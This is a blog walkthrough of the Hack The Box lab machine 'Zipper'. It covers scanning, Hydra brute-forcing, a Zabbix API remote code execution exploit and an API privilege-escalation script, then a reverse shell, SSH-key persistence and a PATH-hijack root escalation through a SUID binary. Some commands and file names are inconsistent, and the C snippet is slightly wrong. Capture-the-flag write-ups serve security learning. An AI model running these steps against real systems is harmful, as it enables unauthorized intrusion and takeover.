---
published: true
layout: post
author: Jake
date: '2019-02-24 00:00:01 UTC'
tags: htb walkthrough zipper
---
This week we are taking a look at the retired Hack The Box machine [Zipper](https://www.hackthebox.eu/home/machines/profile/159) (Medium difficulty)

First we do the needful. Two ports, SSH and HTTP.
```
root@kali: nmap -sC -sV -oN nmap 10.10.10.108                              
Starting Nmap 7.70 ( https://nmap.org ) at 2019-01-06 18:40 AEDT
Nmap scan report for 10.10.10.108
Host is up (0.23s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 59:20:a3:a0:98:f2:a7:14:1e:08:e0:9b:81:72:99:0e (RSA)
|   256 aa:fe:25:f8:21:24:7c:fc:b5:4b:5f:05:24:69:4c:76 (ECDSA)
|_  256 89:28:37:e2:b6:cc:d5:80:38:1f:b2:6a:3a:c3:a1:84 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.42 seconds

With a full scan we get one additional port, 10050, running Zabbix-Agent. Zabbix is a monitoring dashboard, similar to Nagios.

root@kali: nmap -p- --max-retries 1 -Pn -T4 --oN nmap-allports 10.10.10.108
Starting Nmap 7.70 ( https://nmap.org ) at 2019-01-06 18:40 AEDT
Warning: 10.10.10.108 giving up on port because retransmission cap hit (1).
Nmap scan report for 10.10.10.108
Host is up (0.24s latency).
Not shown: 65532 closed ports
PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
10050/tcp open  zabbix-agent

Nmap done: 1 IP address (1 host up) scanned in 320.11 seconds
```

Let's use gobuster to see if we can enumerate directories on the webserver.
```
root@kali: gobuster -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 100 -u http://10.10.10.108 -x txt,html,php

=====================================================
Gobuster v2.0.0              OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://10.10.10.108/
[+] Threads      : 100
[+] Wordlist     : /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes : 200,204,301,302,307,403
[+] Extensions   : txt,html,php
[+] Timeout      : 10s
=====================================================
2019/01/06 18:41:17 Starting gobuster
=====================================================
/index.html (Status: 200)
/zabbix (Status: 301)
/server-status (Status: 403)
```

And what do you know, there's a Zabbix directory! Looks like we can "sign in as guest", but before we do that let's kick off a Hydra run to see if there's any other users we can get. Remember it's always good to do things in parallel.

Hydra can be a bit of a complicated beast, but remember:

-L - The username list you want to test against.
-P - The password list you want to use.

And then the following positional arguments:
- The address of the server
- The method of login (http-post-form)
- The string containing login context information:
	- The URI for logging in.
	- The format of the post body, with the replacements for the ^USER^ and ^PASSWORD^ in the request.
	- The string to look for in failed attempts (if this isn't present then we've logged in!)

```
root@kali: hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt -P /usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt 10.10.10.108 http-post-form "/zabbix/index.php:name=^USER^&password=^PASS^&autologin=1&enter=Sign+in:Login name or password is incorrect."
```

Note that we should probably also let Hydra run with just the 10k most common list for both username and password, as sometimes it gets results (in our case it works).
```
hydra -L ~/toolz/SecLists/Passwords/Common-Credentials/10k-most-common.txt -P ~/toolz/SecLists/Passwords/Common-Credentials/10k-most-common.txt 10.10.10.108 http-post-form "/zabbix/index.php:name=^USER^&password=^PASS^&autologin=1&enter=Sign+in:Login name or password is incorrect."
```

While that's cooking in the background let's login as guest. There's lots to see, but if you poke around enough you will find something that refers to a backup script. Interesting!
![231440552.png]({{site.baseurl}}/Images/Zipper/231440552.png)

Clicking on that link will take you to a timeline screen. Choose the time range of "All":
![231407864.png]({{site.baseurl}}/Images/Zipper/231407864.png)

And clicking on that shows us some detail about that event, but not much else:
![231276662.png]({{site.baseurl}}/Images/Zipper/231276662.png)

We can try clicking on the link to the backup script, but guest doesn't have permission, but it gives us some information about a possible target.

To save you the pain, at this point we started randomly enumerating other parts of Zipper, and tried to guess accounts while Hydra was running. Eventually we stumbled across using Zapper (the name of the backup script) as the username and password. We found this before Hydra finished, so your choice if you want to wait.

Results! We get a different error message.
![231407845.png]({{site.baseurl}}/Images/Zipper/231407845.png)

Okay, "GUI access disabled", sounds like we might have limited access, maybe to an API or something?

As an interesting note, we can also run a limited set of scripts, however for now this is not useful.
![231407842.png]({{site.baseurl}}/Images/Zipper/231407842.png)
![231407839.png]({{site.baseurl}}/Images/Zipper/231407839.png)

Okay, we've hit our limit with just passive enumeration. Time to step it up.

Zabbix has a whole bunch of Vulnerabilities: https://www.cvedetails.com/vulnerability-list/vendor_id-5667/Zabbix.html

In that list there are a couple that are interesting to the version of Zabbix we have (3.0.21), however let's also check out searchsploit, where there is much good for hakk.
```
kali :: ~/CTFs/zipper # searchsploit zabbix                                                                                                                   
---------------------------------------------------------------------------------------------------------------------- ----------------------------------------
 Exploit Title                                                                                                        |  Path
                                                                                                                      | (/usr/share/exploitdb/)
---------------------------------------------------------------------------------------------------------------------- ----------------------------------------
Zabbix - (Authenticated) Remote Command Execution (Metasploit)                                                        | exploits/linux/remote/29321.rb
Zabbix 1.1.2 - Multiple Remote Code Execution Vulnerabilities                                                         | exploits/linux/dos/28775.pl
Zabbix 1.1.4/1.4.2 - 'daemon_start' Local Privilege Escalation                                                        | exploits/linux/local/30839.c
Zabbix 1.1x/1.4.x - File Checksum Request Denial of Service                                                           | exploits/unix/dos/31403.txt
Zabbix 1.6.2 Frontend - Multiple Vulnerabilities                                                                      | exploits/php/webapps/8140.txt
Zabbix 1.8.1 - SQL Injection                                                                                          | exploits/php/webapps/12435.txt
Zabbix 1.8.4 - 'popup.php' SQL Injection                                                                              | exploits/php/webapps/18155.txt
Zabbix 2.0 < 3.0.3 - SQL Injection                                                                                    | exploits/php/webapps/40353.py
Zabbix 2.0.1 - Session Extractor                                                                                      | exploits/php/webapps/20087.py
Zabbix 2.0.5 - Cleartext ldap_bind_Password Password Disclosure (Metasploit)                                          | exploits/php/webapps/36157.rb
Zabbix 2.0.8 - SQL Injection / Remote Code Execution (Metasploit)                                                     | exploits/unix/webapps/28972.rb
Zabbix 2.2 < 3.0.3 - API JSON-RPC Remote Code Execution                                                               | exploits/php/webapps/39937.py
Zabbix 2.2.x/3.0.x - SQL Injection                                                                                    | exploits/php/webapps/40237.txt
Zabbix Agent - 'net.tcp.listen' Command Injection (Metasploit)                                                        | exploits/freebsd/remote/16918.rb
Zabbix Agent 3.0.1 - 'mysql.size' Shell Command Injection                                                             | exploits/linux/local/39769.txt
Zabbix Agent < 1.6.7 - Remote Bypass                                                                                  | exploits/multiple/webapps/10431.txt
Zabbix Server - Arbitrary Command Execution (Metasploit)                                                              | exploits/linux/remote/20796.rb
Zabbix Server - Multiple Vulnerabilities                                                                              | exploits/multiple/webapps/10432.txt
---------------------------------------------------------------------------------------------------------------------- ----------------------------------------
Shellcodes: No Result
```

Hmmn, `39937` looks interesting 
```
kali :: ~/CTFs/zipper # searchsploit -m 39937                                                                                                              2 ↵
  Exploit: Zabbix 2.2 < 3.0.3 - API JSON-RPC Remote Code Execution
      URL: https://www.exploit-db.com/exploits/39937/
     Path: /usr/share/exploitdb/exploits/php/webapps/39937.py
File Type: Python script, ASCII text executable, with CRLF line terminators

Copied to: /root/CTFs/zipper/39937.py
```

(Remember, `-m` mirrors, or copies, the chosen exploit script or info file locally, not all exploitdb references have scripts, some are just writeups.)

Modify the script to include our details, we find the HostID back in Zabbix, at Reports>Zapper's Backup Script>Detail Screen>Click on "Zabbix" (next to Host), and in the popup choose "Host Inventory". The hostid will be in the URL of the page that opens.
```
ZABIX_ROOT = 'http://10.10.10.108/zabbix'       ### Zabbix IP-address
url = ZABIX_ROOT + '/api_jsonrpc.php'   ### Don't edit

login = 'zapper'                ### Zabbix login
password = 'zapper'     ### Zabbix password
hostid = '10105'        ### Zabbix hostid

...
```

Running the script, and listing the contents of the directory we land in just shows us that we default to "/".
```
kali :: ~/CTFs/zipper # python 39937.py                                                                                                                       
[zabbix_cmd]>>:  ls
backups
bin
boot
dev
etc
home
lib
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var
```

And let's check the users on the box.
```
    cat /etc/passwd
     
    root:x:0:0:root:/root:/bin/bash
    daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
    bin:x:2:2:bin:/bin:/usr/sbin/nologin
    sys:x:3:3:sys:/dev:/usr/sbin/nologin
    sync:x:4:65534:sync:/bin:/bin/sync
    games:x:5:60:games:/usr/games:/usr/sbin/nologin
    man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
    lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
    mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
    news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
    uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
    proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
    www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
    backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
    list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
    irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
    gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
    nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
    _apt:x:100:65534::/nonexistent:/usr/sbin/nologin
    mysql:x:101:101:MySQL Server,,,:/nonexistent:/bin/false
    Debian-snmp:x:102:103::/var/lib/snmp:/bin/false
    zabbix:x:103:104::/var/lib/zabbix/:/usr/sbin/nologin
```

Let's look in that /backups directory:
```
[zabbix_cmd]>>:  ls backups
zabbix_scripts_backup-2019-02-25.7z
zapper_backup-2019-02-25.7z
Okay, the scripts backup is passworded:

[zabbix_cmd]>>:  7z e /backups/zabbix_scripts_backup-2019-02-25.7z

7-Zip [32] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
p7zip Version 16.02 (locale=C,Utf16=off,HugeFiles=on,32 bits,1 CPU Intel(R) Xeon(R) CPU E5-2650 v3 @ 2.30GHz (306F2),ASM,AES-NI)

Scanning the drive for archives:
1 file, 330 bytes (1 KiB)

Extracting archive: /backups/zabbix_scripts_backup-2019-02-25.7z
--
Path = /backups/zabbix_scripts_backup-2019-02-25.7z
Type = 7z
Physical Size = 330
Headers Size = 154
Method = LZMA2:12 7zAES
Solid = -
Blocks = 1

Enter password (will not be echoed):ERROR: Data Error in encrypted file. Wrong password? : backup_script.sh
Sub items Errors: 1
Archives with Errors: 1
Sub items Errors: 1
```

So is the other file. Maybe there's something on this box that creates those files on the reg?

Let's search for *.sh scripts. If we don't find anything then we move on to plan B, which is to search for .pl and .py files.
```
find / -name "*.sh" 2>/dev/null
/etc/init.d/hwclock.sh
/lib/init/vars.sh
/usr/lib/zabbix/externalscripts/backup_script.sh
/usr/share/debconf/confmodule.sh
cat /usr/lib/zabbix/externalscripts/backup_script.sh
7z a /backups/zabbix_scripts_backup-$(date +%F).7z -pZippityDoDah /usr/lib/zabbix/externalscripts/* &>/dev/null
```

Let's extract:
```
[zabbix_cmd]>>:  7z e -pZippityDoDah /backups/zabbix_scripts_backup-2019-02-25.7z -o/tmp

7-Zip [32] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
p7zip Version 16.02 (locale=C,Utf16=off,HugeFiles=on,32 bits,1 CPU Intel(R) Xeon(R) CPU E5-2650 v3 @ 2.30GHz (306F2),ASM,AES-NI)

Scanning the drive for archives:
1 file, 330 bytes (1 KiB)

Extracting archive: /backups/zabbix_scripts_backup-2019-02-25.7z
--
Path = /backups/zabbix_scripts_backup-2019-02-25.7z
Type = 7z
Physical Size = 330
Headers Size = 154
Method = LZMA2:12 7zAES
Solid = -
Blocks = 1

Everything is Ok

Size:       198
Compressed: 330

[zabbix_cmd]>>:  ls /tmp
backup_script.sh
tmp.c0yDu2npGa

[zabbix_cmd]>>:  cat /tmp/backup_script.sh
#!/bin/bash
# zapper wanted a way to backup the zabbix scripts so here it is:
7z a /backups/zabbix_scripts_backup-$(date +%F).7z -pZippityDoDah /usr/lib/zabbix/externalscripts/* &>/dev/null
echo $?
```

Hmmn, this looks like a giant loop. Oops. The only script backed up is the script that backs up all the scripts... Not useful for now.

Okay, well, plan B. We have a user on the Zabbix host, maybe we can get ourselves more meaningful shell?

https://www.zabbix.com/documentation/3.2/manual/api/reference/user/create tells us we can create a user on the box. Let's do this:

Firstly, I'm automating this with python, but feel free to do this by hand. We know a few things from the doco:

GUI access should be 0 for it to be enabled, and that the admin group is group 7 https://www.zabbix.com/documentation/3.2/manual/api/reference/usergroup/get. Looking at that it could be that we're in user group 12, which prevents us from viewing the GUI. Two birds with one stone, let's add ourselves to admin.
```
import requests
import pprint
// Because I like pretty output
pp = pprint.PrettyPrinter(indent=4)
// Handy, in case there's cookies. Wasn't really needed in this instance.
session = requests.Session()
// Should be the same.
base_url = "http://10.10.10.108/zabbix/api_jsonrpc.php"
//Based on the API doco, these are the params from the login request. I'm using the requests library, so I can built a JSON payload from python dictionaries and lists.
login_params = {
            "user": "zapper",
            "password": "zapper",
            "userData": True
        }
// The final request payload.
request_params = {
            "jsonrpc": "2.0",
            "method": "user.login",
            "id": 1,
            "params": login_params
        }
// We need this, otherwise it don't work.
headers = {"Content-type": "application/json-rpc"}
// Submit out request.
login_resp = session.post(base_url, headers=headers, json=request_params)
//Get our login info, and print it out. The .json() function pre-parses the data back from zabbix, so we don't have to explicitly do it.
login_info = login_resp.json()
pp.pprint(login_info)
// In the response was an auth token. We need that for the next request.
auth = login_info["result"]["sessionid"]
print("Got auth token "+auth)

//Now we set up the dictionaries for the groups update request, first setting the userid and group we want to add our user to.
update_params = {
            "userid": "3",
            "usrgrps": "7"
        }
// And then building the full request.
request_params = {
            "jsonrpc": "2.0",
            "method": "user.update",
            "id": 1,
            "params": update_params,
            "auth": auth

        }

//Just printing this here to check our params look OK.
pp.pprint(request_params)

// Send off the request.
update_resp = session.post(base_url, headers=headers, json=request_params)

//And check our results. You should see a confirmation that it updated, or an error if it didn't :(
update_info = update_resp.json()

pp.pprint(update_info)
```

And now log in as that user:
![231243965.png]({{site.baseurl}}/Images/Zipper/231243965.png)

Now we are an admin we should be able to set up our own script and call it. This should let us trigger a reverse shell.
![231473330.png]({{site.baseurl}}/Images/Zipper/231473330.png)

Go to administration>scripts>create script, and create a script like the following, the code was taken from pentest monkey, bear in mind that we need to update python to python3 in the text, as the box only has python3 installed.

Now go back to the availability report. You should be able to find an event for a server called "Zipper". Open up any event and run the script you just created.
![231407914.png]({{site.baseurl}}/Images/Zipper/231407914.png)

And BAM!
```
kali :: ~/CTFs/zipper # nc -lnvp 1337                                                                                                                         
Listening on [unknown] (family 0, port -1835784908)
Connection from 10.10.10.108 57714 received!
/bin/sh: 0: can't access tty; job control turned off
$ 
```

First up, let's upgrade that icky /bin/sh shell we have:
```
$ python3 -c "import pty; pty.spawn('/bin/bash')"
zabbix@zipper:/$ 
```

Much better. Now let's see if we can get user.txt.
```
zabbix@zipper:/home/zapper$ cat user.txt
cat user.txt
cat: user.txt: Permission denied
zabbix@zipper:/home/zapper$ 
```

Ah damn. But what about the utils directory:
```
zabbix@zipper:/home/zapper/utils$ cat back	
cat backup.sh 
#!/bin/bash
#
# Quick script to backup all utilities in this folder to /backups
#
/usr/bin/7z a /backups/zapper_backup-$(/bin/date +%F).7z -pZippityDoDah /home/zapper/utils/* &>/dev/null
```

Okay, that's the second time we've seen that password. Sometimes in these CTF's the password for one thing (like passwording a zip file) is reused. Let's see if we can su to Zapper:
```
su zapper
Password: ZippityDoDah


              Welcome to:
███████╗██╗██████╗ ██████╗ ███████╗██████╗ 
╚══███╔╝██║██╔══██╗██╔══██╗██╔════╝██╔══██╗
  ███╔╝ ██║██████╔╝██████╔╝█████╗  ██████╔╝
 ███╔╝  ██║██╔═══╝ ██╔═══╝ ██╔══╝  ██╔══██╗
███████╗██║██║     ██║     ███████╗██║  ██║
╚══════╝╚═╝╚═╝     ╚═╝     ╚══════╝╚═╝  ╚═╝

[0] Packages Need To Be Updated
[>] Backups:
4.0K	/backups/zapper_backup-2019-02-25.7z

Phew, let's get user.txt:

zapper@zipper:~$ cat user.txt
cat user.txt
aa29...8fe33
```

Okay, now we need to privesc, but before that let's add an ssh key to the authorized_keys file.
```
kali :: ~/CTFs/zipper # cat id_rsa.pub                                                                                                                        
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDBdV/51eYJATacXK143uB/7+cF7XLEKGcjxAdjJYqu/heD+wS/75aBtO864nbhzjYp+ddO7vxQBHckFvKBzp/58/k+UEviOUOpBMuI4s17sXm1TkjlA2bUDZdJLSCD/+24IyELyErvz1fyQngCTfS4y8cJgkai+HsPJtuJml/QJ81e3wim7T/W3fBCyz+w/GffTqBfoIoBhxebf99+5haRUukX1Q7u3a7Oe+6W8zmAxFvJ7jU4oS8DCG5XFUGZBEFOqkbBbs3QrUZ5eTcfvaL12vTE/mIra6FY4TKVdviXvokXuoF1cN7xQqYDvZRc1l8VENFibIRIoB+YCk8t2fMN root@kali
kali :: ~/CTFs/zipper # chmod 0600 id_rsa                                                                   kali :: ~/CTFs/zipper # ssh -i id_rsa 10.10.10.108                                                                                                            
root@10.10.10.108: Permission denied (publickey).

----In our reverse shell:
zapper@zipper:~/.ssh$ echo ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDBdV/51eYJATacXK143uB/7+cF7XLEKGcjxAdjJYqu/heD+wS/75aBtO864nbhzjYp+ddO7vxQBHckFvKBzp/58/k+UEviOUOpBMuI4s17sXm1TkjlA2bUDZdJLSCD/+24IyELyErvz1fyQngCTfS4y8cJgkai+HsPJtuJml/QJ81e3wim7T/W3fBCyz+w/GffTqBfoIoBhxebf99+5haRUukX1Q7u3a7Oe+6W8zmAxFvJ7jU4oS8DCG5XFUGZBEFOqkbBbs3QrUZ5eTcfvaL12vTE/mIra6FY4TKVdviXvokXuoF1cN7xQqYDvZRc1l8VENFibIRIoB+YCk8t2fMN root@kali > authorized_keys
<l8VENFibIRIoB+YCk8t2fMN root@kali > authorized_keys
zapper@zipper:~/.ssh$ cat authorized_keys
cat authorized_keys
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDBdV/51eYJATacXK143uB/7+cF7XLEKGcjxAdjJYqu/heD+wS/75aBtO864nbhzjYp+ddO7vxQBHckFvKBzp/58/k+UEviOUOpBMuI4s17sXm1TkjlA2bUDZdJLSCD/+24IyELyErvz1fyQngCTfS4y8cJgkai+HsPJtuJml/QJ81e3wim7T/W3fBCyz+w/GffTqBfoIoBhxebf99+5haRUukX1Q7u3a7Oe+6W8zmAxFvJ7jU4oS8DCG5XFUGZBEFOqkbBbs3QrUZ5eTcfvaL12vTE/mIra6FY4TKVdviXvokXuoF1cN7xQqYDvZRc1l8VENFibIRIoB+YCk8t2fMN root@kali
zapper@zipper:~/.ssh$ 
---Back in Kali
kali :: ~/CTFs/zipper # ssh -i id_rsa zapper@10.10.10.108                                                                                                255 ↵
Welcome to Ubuntu 18.04.1 LTS (GNU/Linux 4.15.0-33-generic i686)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

Last login: Wed Oct 10 15:28:33 2018

              Welcome to:
███████╗██╗██████╗ ██████╗ ███████╗██████╗ 
╚══███╔╝██║██╔══██╗██╔══██╗██╔════╝██╔══██╗
  ███╔╝ ██║██████╔╝██████╔╝█████╗  ██████╔╝
 ███╔╝  ██║██╔═══╝ ██╔═══╝ ██╔══╝  ██╔══██╗
███████╗██║██║     ██║     ███████╗██║  ██║
╚══════╝╚═╝╚═╝     ╚═╝     ╚══════╝╚═╝  ╚═╝

[0] Packages Need To Be Updated
[>] Backups:
4.0K	/backups/zapper_backup-2019-02-25.7z
4.0K	/backups/zabbix_scripts_backup-2019-02-25.7z
                                      

zapper@zipper:~$ 
```
Now the enumeration begins. Let's start with SUID binaries:
```
zapper@zipper:~$ find / -perm -4000 -type f 2>/dev/null
/home/zapper/utils/zabbix-service
/bin/ntfs-3g
/bin/umount
/bin/fusermount
/bin/ping
/bin/su
/bin/mount
/usr/bin/passwd
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/sudo
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/bin/traceroute6.iputils
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
```

And would you look at that, zabbix-service looks out of place. Let's have a look shall we (use strings).
```
tdx	
/lib/ld-linux.so.2
libc.so.6
_IO_stdin_used
setuid
puts
stdin
printf
fgets
strcspn
system
__cxa_finalize
setgid
strcmp
__libc_start_main
__stack_chk_fail
GLIBC_2.1.3
GLIBC_2.4
GLIBC_2.0
_ITM_deregisterTMCloneTable
__gmon_start__
_ITM_registerTMCloneTable
Y[^]
UWVS
[^_]
start or stop?: 
start
systemctl daemon-reload && systemctl start zabbix-agent
stop
systemctl stop zabbix-agent
[!] ERROR: Unrecognized Option
...
```

Looks like it uses libc and just runs systemctl, triggering zabbix to restart.

We tried to overload libc.so with our own, but no bueno. Can we do anything with abusing paths? Given it's trying to run systemctl we can overload it by redefining the path variable to point to a directory of our choosing with a replacement binary, that instead of running systemctl, runs a binary with the same name as systemctl, except our binary will give us r00t.
```
#include <stdio.h>
int main(void) {
       setgid(0); setuid(0);
       system("/bin/bash",NULL,NULL); 
}
```

The above code will be our privesc. As zabbix-start is running with a sticky bit we will be able to spawn a process as root and call it rev.c.

The following command will compile the above code. One of the things we need to check for is the OS architecture. We're on a 64-bit system locally (kali) but the server is 32-bit, we can check with:
```
uname -a
Linux zipper 4.15.0-33-generic #36-Ubuntu SMP Wed Aug 15 13:44:35 UTC 2018 i686 i686 i686 GNU/Linux
```

To compile:
```
gcc rev.c -o systemctl -m32 
```

And copy the code over:
```
scp -i zapper_rsa ~/Documents/htb/Zipper/rev zapper@10.10.10.108:/tmp/thoseguys/rev
```

And to update our path we then do the following. What we are doing here is adding our directory first in the path list, which will get looked in first, meaning our chosen binary will be run before anything else.
```
zapper@zipper:/tmp/thoseguys$ echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games
zapper@zipper:/tmp/thoseguys$ export PATH=/tmp/thoseguys:$PATH
zapper@zipper:/tmp/thoseguys$ echo $PATH
/tmp/thoseguys:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games
```

And Finally run zabbix-start and we are away!
![231342373.png]({{site.baseurl}}/Images/Zipper/231342373.png)

